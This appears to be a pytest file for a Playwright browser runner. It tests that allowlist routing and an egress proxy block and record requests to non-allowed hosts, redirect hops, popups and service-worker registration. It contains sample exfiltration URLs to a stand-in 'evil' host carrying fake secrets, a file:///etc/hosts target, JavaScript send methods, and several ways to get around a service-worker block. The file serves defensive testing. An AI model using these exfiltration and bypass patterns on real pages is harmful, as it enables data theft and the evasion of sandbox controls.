"""Routing before the first page: every request and WebSocket the session's
pages start is judged against the run's allowlist, and one the egress proxy
would refuse is aborted and recorded; the proxy stays the enforcer behind it,
for the redirect hops routing never sees (ADR-0026 amendment, 2026-10-02;
SECURITY.md §7). Service workers are refused, and popups meet the same routes
and proxy. The browser tests launch real Chromium on the OS that runs them:
Linux in CI, macOS locally."""

import asyncio
import threading
from collections.abc import AsyncIterator, Awaitable, Callable, Iterator
from contextlib import asynccontextmanager
from dataclasses import dataclass
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest
from aqa_runner.browser_session import BrowserSession, open_browser_session
from aqa_runner.egress import EgressGate, EgressPolicy
from aqa_runner.egress_proxy import EgressProxy
from aqa_runner.routing import BlockedAttempt, BlockedAttempts, refused_attempt
from playwright.async_api import BrowserContext, Error, Page, async_playwright

from packages.runner.tests.egress_fixtures import LOOPBACK, egress_proxy, gate, serving

POLICY = EgressPolicy(
    allowed_origins=("http://app.example.test:8080", "https://[2001:db8::1]:8443"),
    subresource_hosts=("cdn.example.test",),
    private_origins=(),
)

# What the egress proxy passes, from ADR-0026's amendment on it: an allowed
# origin on its own port whatever the scheme; a subresource host on 80 for a
# plain request (http) and on 443 for a tunnel (https, wss, and ws, which
# Chromium tunnels too). A URL's user part never reaches the proxy. Any other
# scheme the proxy carries nothing for.
VERDICTS = {
    "http://app.example.test:8080/cart?item=1": False,
    "https://app.example.test:8080/": False,
    "ws://app.example.test:8080/socket": False,
    "http://APP.example.test:8080/": False,
    "https://[2001:db8::1]:8443/": False,
    "http://cdn.example.test/app.js": False,
    "https://cdn.example.test/app.js": False,
    "wss://cdn.example.test/live": False,
    "http://app.example.test/": True,
    "ws://cdn.example.test/live": True,
    "http://cdn.example.test:443/": True,
    "http://evil.example.test:8080/": True,
    "http://[2001:db8::2]:8443/": True,
    "ftp://app.example.test:8080/": True,
    "file:///etc/hosts": True,
    "http://fake-user@app.example.test:8080/": False,
    # Authorities no origin writes, which the proxy refuses too.
    "http://app.example.test:0/": True,
    "http://[v1.example.test]/": True,
}


@pytest.mark.parametrize(("url", "refused"), VERDICTS.items(), ids=list(VERDICTS))
def test_routing_judges_a_url_as_the_egress_proxy_does(
    url: str, *, refused: bool
) -> None:
    assert (refused_attempt(url, POLICY, "fetch") is not None) is refused


# A blocked attempt keeps where it went, never the path or query, where an
# exfiltration URL carries its data, nor a URL's user part.
RECORDED = {
    "ws://cdn.example.test/live?token=fake-secret": BlockedAttempt(
        resource_type="websocket", scheme="ws", host="cdn.example.test", port=80
    ),
    "https://evil.example.test/steal/fake-secret": BlockedAttempt(
        resource_type="websocket", scheme="https", host="evil.example.test", port=443
    ),
    "http://fake-user:fake-pass@evil.example.test/": BlockedAttempt(
        resource_type="websocket", scheme="http", host="evil.example.test", port=80
    ),
    "http://[2001:db8::2]:8443/": BlockedAttempt(
        resource_type="websocket", scheme="http", host="[2001:db8::2]", port=8443
    ),
    "file:///etc/hosts": BlockedAttempt(
        resource_type="websocket", scheme="file", host="", port=None
    ),
}


@pytest.mark.parametrize(("url", "attempt"), RECORDED.items(), ids=list(RECORDED))
def test_a_blocked_attempt_keeps_only_where_it_went(
    url: str, attempt: BlockedAttempt
) -> None:
    assert refused_attempt(url, POLICY, "websocket") == attempt


# The calls each of a session's browser contexts received, in order, so a
# test can see whether its routes were in place before its first page.
type Calls = dict[int, list[str]]


def recording_calls(monkeypatch: pytest.MonkeyPatch) -> Calls:
    """Record every route, WebSocket route and new page, by context."""
    calls: Calls = {}
    for name in ("route", "route_web_socket", "new_page"):
        original = getattr(BrowserContext, name)

        async def recorded(
            context: BrowserContext,
            *args: object,
            _name: str = name,
            _original: Callable[..., Awaitable[object]] = original,
            **kwargs: object,
        ) -> object:
            calls.setdefault(id(context), []).append(_name)
            return await _original(context, *args, **kwargs)

        monkeypatch.setattr(BrowserContext, name, recorded)
    return calls


def test_routes_are_in_place_before_the_first_page(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls = recording_calls(monkeypatch)

    async def scenario() -> list[str]:
        async with (
            async_playwright() as playwright,
            egress_proxy() as egress,
            open_browser_session(playwright.chromium, egress=egress) as session,
        ):
            return calls[id(session.page.context)]

    session_calls = asyncio.run(scenario())

    first_page = session_calls.index("new_page")
    assert {"route", "route_web_socket"} <= set(session_calls[:first_page])


APP = "app.example.test"
EVIL = "evil.example.test"


@asynccontextmanager
async def browsing(
    egress: EgressGate,
) -> AsyncIterator[tuple[EgressProxy, BrowserSession]]:
    """A browser session whose traffic goes through a proxy for `egress`."""
    async with (
        async_playwright() as playwright,
        EgressProxy(egress) as proxy,
        open_browser_session(playwright.chromium, egress=proxy) as session,
    ):
        yield proxy, session


def app_gate(port: int) -> EgressGate:
    """A run that starts at http://app.example.test:`port`, a local server."""
    return gate(allowed=(f"http://{APP}:{port}",), answers={APP: LOOPBACK})


# How a page sends to `url`, by method, each settling whatever happens.
SENDS = {
    "fetch": "(url) => fetch(url).then(() => 'sent', () => 'failed')",
    "xhr": """(url) => new Promise((done) => {
        const request = new XMLHttpRequest();
        request.onload = () => done("sent");
        request.onerror = () => done("failed");
        request.open("GET", url);
        request.send();
    })""",
    "form-post": """(url) => {
        const form = document.createElement("form");
        form.method = "post";
        form.action = url;
        document.body.append(form);
        form.submit();
    }""",
    "popup": "(url) => { window.open(url); }",
    "websocket": """(url) => new Promise((done) => {
        const socket = new WebSocket(url);
        socket.onopen = () => done("open");
        socket.onclose = () => done("closed");
    })""",
}

# The method's scheme and Playwright's resource type for what it sends.
SENT_AS = {
    "fetch": ("http", "fetch"),
    "xhr": ("http", "xhr"),
    "form-post": ("http", "document"),
    "popup": ("http", "document"),
    "websocket": ("ws", "websocket"),
}


@pytest.mark.parametrize("method", SENDS, ids=list(SENDS))
def test_each_blocked_attempt_is_aborted_and_recorded(method: str) -> None:
    scheme, resource_type = SENT_AS[method]
    with serving() as origin:
        egress = app_gate(origin.port)

        async def scenario() -> BlockedAttempts:
            async with browsing(egress) as (proxy, session):
                await session.page.goto(f"http://{APP}:{origin.port}/")
                target = f"{scheme}://{EVIL}:{origin.port}/exfil?data=fake-secret"
                if scheme == "ws":
                    assert (
                        await session.page.evaluate(SENDS[method], target) == "closed"
                    )
                else:
                    context = session.page.context
                    async with context.expect_event("requestfailed") as failed:
                        await session.page.evaluate(SENDS[method], target)
                    request = await failed.value
                    assert (request.failure or "").startswith(
                        "net::ERR_BLOCKED_BY_CLIENT"
                    )
                return proxy.blocked_attempts

        blocked = asyncio.run(scenario())

    assert blocked.first == [BlockedAttempt(resource_type, scheme, EVIL, origin.port)]
    assert blocked.total == 1
    # Routing aborted it before the proxy saw it, and nothing reached the host.
    assert egress.refusals == []
    assert origin.hosts() == [APP]


def test_blocked_attempts_keep_the_first_thousand_and_count_them_all() -> None:
    blocked = BlockedAttempts()
    attempts = [BlockedAttempt("fetch", "http", EVIL, port) for port in range(1, 1202)]

    for attempt in attempts:
        blocked.add(attempt)

    assert blocked.first == attempts[:1000]
    assert blocked.total == 1201


async def navigate(page: Page, url: str) -> int | str:
    """The status a navigation got, or the network error it failed with."""
    try:
        response = await page.goto(url)
    except Error as error:
        return error.message.split()[1]
    assert response is not None
    return response.status


def test_a_redirect_hop_routing_never_sees_is_refused_by_the_proxy() -> None:
    # Routing sees only a redirect chain's first request (LAB_NOTES,
    # 2026-09-29), so it never enforces alone.
    with serving() as origin:
        egress = app_gate(origin.port)
        hop = f"http://{EVIL}:{origin.port}/landed"

        async def scenario() -> tuple[int | str, BlockedAttempts]:
            async with browsing(egress) as (proxy, session):
                outcome = await navigate(
                    session.page, f"http://{APP}:{origin.port}/redirect?to={hop}"
                )
                return outcome, proxy.blocked_attempts

        outcome, blocked = asyncio.run(scenario())

    assert outcome == "net::ERR_EMPTY_RESPONSE"
    assert blocked.total == 0
    assert [(r.host, r.port, r.kind) for r in egress.refusals] == [
        (EVIL, origin.port, "host")
    ]
    assert origin.hosts() == [APP]


def test_a_popup_meets_the_contexts_routes_and_proxy() -> None:
    with serving() as origin:
        egress = app_gate(origin.port)
        start = f"http://{APP}:{origin.port}"
        straight = f"http://{EVIL}:{origin.port}/straight"
        hop = f"{start}/redirect?to=http://{EVIL}:{origin.port}/hop"

        async def scenario() -> BlockedAttempts:
            async with browsing(egress) as (proxy, session):
                await session.page.goto(f"{start}/")
                context = session.page.context
                for url in (straight, hop):
                    async with context.expect_event("requestfailed"):
                        await session.page.evaluate(SENDS["popup"], url)
                return proxy.blocked_attempts

        blocked = asyncio.run(scenario())

    # Routing aborted the popup sent straight to the host; the proxy refused
    # the one that got there by a redirect.
    assert blocked.first == [BlockedAttempt("document", "http", EVIL, origin.port)]
    assert [(r.host, r.kind) for r in egress.refusals] == [(EVIL, "host")]
    assert origin.hosts() == [APP, APP]


@dataclass
class WorkerSite:
    """A site that serves a page and a service worker script, and the paths
    it was asked for."""

    origin: str
    paths: list[str]


@pytest.fixture
def worker_site() -> Iterator[WorkerSite]:
    paths: list[str] = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            paths.append(self.path)
            script = self.path.endswith(".js")
            body = (
                b"self.addEventListener('fetch', () => {});"
                if script
                else b"<!doctype html><title>Workers</title><body></body>"
            )
            self.send_response(HTTPStatus.OK)
            self.send_header(
                "Content-Type", "text/javascript" if script else "text/html"
            )
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever)
    thread.start()
    try:
        # Loopback is a secure context, the only kind that may register one.
        yield WorkerSite(f"http://127.0.0.1:{server.server_port}", paths)
    finally:
        server.shutdown()
        thread.join()
        server.server_close()


# Every way a page might register a service worker, each reporting whether it
# registered one: the plain call, the prototype's method (Playwright's own
# block replaces only the instance's), the method once the instance's is
# deleted, and the method in other realms the page can reach.
REGISTER_EVERY_WAY = """async () => {
    const outcomes = {};
    const attempt = async (name, register) => {
        try {
            const registration = await register();
            outcomes[name] = registration ? "registered" : "no registration";
        } catch (error) {
            outcomes[name] = `refused: ${error.name}`;
        }
    };
    const viaPrototype = (realm) => () =>
        realm.ServiceWorkerContainer.prototype.register.call(
            realm.navigator.serviceWorker, "/sw.js"
        );
    await attempt("plain", () => navigator.serviceWorker.register("/sw.js"));
    await attempt("prototype", viaPrototype(window));
    await attempt("deleted", () => {
        delete navigator.serviceWorker.register;
        return navigator.serviceWorker.register("/sw.js");
    });
    const blank = document.createElement("iframe");
    document.body.append(blank);
    await attempt("blank-iframe", viaPrototype(blank.contentWindow));
    const framed = document.createElement("iframe");
    framed.src = "/frame";
    const loaded = new Promise((done) => { framed.onload = done; });
    document.body.append(framed);
    await loaded;
    await attempt("same-origin-iframe", viaPrototype(framed.contentWindow));
    await attempt("popup", viaPrototype(window.open("about:blank")));
    outcomes.registrations = (await navigator.serviceWorker.getRegistrations()).length;
    return outcomes;
}"""

REGISTERS = [
    "plain",
    "prototype",
    "deleted",
    "blank-iframe",
    "same-origin-iframe",
    "popup",
]


def test_a_service_worker_registration_fails_every_way(worker_site: WorkerSite) -> None:
    async def scenario() -> dict[str, object]:
        async with (
            async_playwright() as playwright,
            egress_proxy(worker_site.origin) as egress,
            open_browser_session(playwright.chromium, egress=egress) as session,
        ):
            await session.page.goto(f"{worker_site.origin}/")
            outcomes: dict[str, object] = await session.page.evaluate(
                REGISTER_EVERY_WAY
            )
            return outcomes

    outcomes = asyncio.run(scenario())

    assert [name for name in REGISTERS if outcomes[name] == "registered"] == []
    assert outcomes["registrations"] == 0
    assert "/sw.js" not in worker_site.paths


def test_a_context_that_allows_service_workers_registers_one(
    worker_site: WorkerSite,
) -> None:
    # The control: the same browser, in a context of the test's own that
    # allows service workers, registers one, so the test above can see it.
    async def scenario() -> object:
        async with (
            async_playwright() as playwright,
            egress_proxy(worker_site.origin) as egress,
            open_browser_session(playwright.chromium, egress=egress) as session,
        ):
            browser = session.page.context.browser
            assert browser is not None
            allowing = await browser.new_context(
                service_workers="allow",
                proxy={"server": egress.url, "bypass": "<-loopback>"},
            )
            page = await allowing.new_page()
            await page.goto(f"{worker_site.origin}/")
            return await page.evaluate(
                "navigator.serviceWorker.register('/sw.js').then((r) => r.scope)"
            )

    assert asyncio.run(scenario()) == f"{worker_site.origin}/"
    assert "/sw.js" in worker_site.paths
